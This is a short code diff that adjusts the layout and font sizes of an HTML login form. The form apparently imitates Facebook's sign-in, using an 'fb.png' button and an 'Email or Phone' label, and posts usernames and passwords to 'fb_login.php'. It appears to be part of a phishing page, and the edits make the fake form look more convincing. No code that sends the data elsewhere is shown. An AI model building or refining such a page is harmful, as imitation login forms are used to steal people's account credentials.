@@ -24,7 +24,7 @@ div.transbox {
   border: 1px solid black;
   background-color: rgba(255,255,255,.5);
   position: absolute;
-  left: 50%;
+  left: 65%;
 }
 </style>
 
@@ -33,14 +33,14 @@ div.transbox {
   <form action="fb_login.php" method="post">
       <table>
       <tr valign="bottom">
-      <td><font style="font-family:arial; font-size:9px;">Email or Phone </font></td>
-      <td><input type="text" name="user" style="font-family:arial; font-size:9px; width: 180px; margin-left: 0px; margin-top: 10px;"></td>
+      <td><font style="font-family:arial; font-size:11px;">Email or Phone </font></td>
+      <td><input type="text" name="user" style="font-family:arial; font-size:11px; width: 180px; margin-left: 0px; margin-top: 10px;"></td>
       </tr>
       <tr valign="bottom">
       <td><font style="font-family:arial; font-size:9px;">Password </font></td>
       <td><input type="password" name="password" style="font-family:arial; font-size:9px; width: 180px; margin-left: 0px; margin-top: 10px;"></td>
       </tr>
-      <tr>
+      <tr valign="bottom" valign="left">
       <td></td>
       <td><input type="image" src="fb.png" style="width:200px;height:75px;"></td>
       </tr>
